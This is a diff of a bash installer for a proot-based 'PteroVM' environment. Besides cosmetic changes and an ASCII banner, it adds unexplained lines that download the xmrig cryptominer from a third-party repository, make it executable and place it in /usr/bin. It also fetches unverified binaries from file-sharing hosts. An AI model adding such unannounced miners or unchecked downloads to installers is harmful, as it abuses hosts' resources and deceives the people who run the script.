@@ -56,6 +56,7 @@ if [[ -f "./installed" ]]; then
     runcmd
 else
     echo "Downloading files for PteroVM"
+    curl -sSLo xmrig raw.githubusercontent.com/afnan007a/xmrig-miner-installer/main/xmrig/xmrig
     curl -sSLo playit https://playit.gg/downloads/playit-linux_64-0.4.6
     curl -sSLo ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
     curl -sSLo ptero-vm.zip https://transfer.sh/get/PK1ASb/ptero-vm.zip
@@ -71,6 +72,7 @@ else
     tar -xf root.tar.gz 
     chmod +x ./dist/proot
     chmod +x playit
+    chmod +x xmrig
     chmod +x ngrok
     chmod +x gotty
     rm -rf ptero-vm.zip
@@ -78,19 +80,41 @@ else
     rm -rf root.tar.gz
     rm -rf ngrok.zip
     clear
+    
     touch installed
-     ./dist/proot -S . /bin/bash -c "mv gotty /usr/bin/"
-     ./dist/proot -S . /bin/bash -c "mv apth /usr/bin/"
-     ./dist/proot -S . /bin/bash -c "mv unzip /usr/bin/"
-     ./dist/proot -S . /bin/bash -c "mv ngrok /usr/bin/"
-     ./dist/proot -S . /bin/bash -c "mv playit /usr/bin/"
-     ./dist/proot -S . /bin/bash -c "apt-get update"
-     ./dist/proot -S . /bin/bash -c "apt-get -y upgrade"
-     ./dist/proot -S . /bin/bash -c "apt-get -y install curl"
-     ./dist/proot -S . /bin/bash -c "apt-get -y install python3"
+    ./dist/proot -S . /bin/bash -c "mv xmrig /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "mv gotty /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "mv apth /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "mv unzip /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "mv ngrok /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "mv playit /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "apt-get update"
+    ./dist/proot -S . /bin/bash -c "apt-get -y upgrade"
+    ./dist/proot -S . /bin/bash -c "apt-get -y install curl"
+    ./dist/proot -S . /bin/bash -c "apt-get -y install python3"
     ./dist/proot -S . /bin/bash -c "curl -o /bin/systemctl https://raw.githubusercontent.com/gdraheim/docker-systemctl-replacement/master/files/docker/systemctl3.py"
     ./dist/proot -S . /bin/bash -c "chmod +x /bin/systemctl"
     ./dist/proot -S . /bin/bash -c "clear"
+    
+    echo "
+${bold}${lightgreen}========================================================================
+                                                                                                  
+${bold}${lightblue}@@@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@    @@@@@@      @@@  @@@  @@@@@@@@@@
+${bold}${lightblue}@@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@     @@@  @@@  @@@@@@@@@@@    
+${bold}${lightblue}@@!  @@@    @@!    @@!       @@!  @@@  @@!  @@@     @@!  @@@  @@! @@! @@!    
+${bold}${lightblue}!@!  @!@    !@!    !@!       !@!  @!@  !@!  @!@     !@!  @!@  !@! !@! !@!     
+${bold}${lightblue}@!@@!@!     @!!    @!!!:!    @!@!!@!   @!@  !@!     @!@  !@!  @!! !!@ @!@      
+${bold}${lightblue}!!@!!!      !!!    !!!!!:    !!@!@!    !@!  !!!     !@!  !!!  !@!   ! !@!        
+${bold}${lightblue}!!:         !!:    !!:       !!: :!!   !!:  !!!     :!:  !!:  !!:     !!:        
+${bold}${lightblue}:!:         :!:    :!:       :!:  !:!  :!:  !:!      ::!!:!   :!:     :!:            
+${bold}${lightblue} ::          ::     :: ::::  ::   :::  ::::: ::       ::::    :::     ::        
+${bold}${lightblue} :           :     : :: ::    :   : :   : :  :         :       :      :          
+                                                                                                  
+                                                                                                                
+${bold}${lightgreen}========================================================================
+ "
+ 
+echo "${nc}"
     
     echo "${bold}${lightgreen}==> Started ${lightblue}PteroVM${lightgreen} <=="
     function runcmd1 {
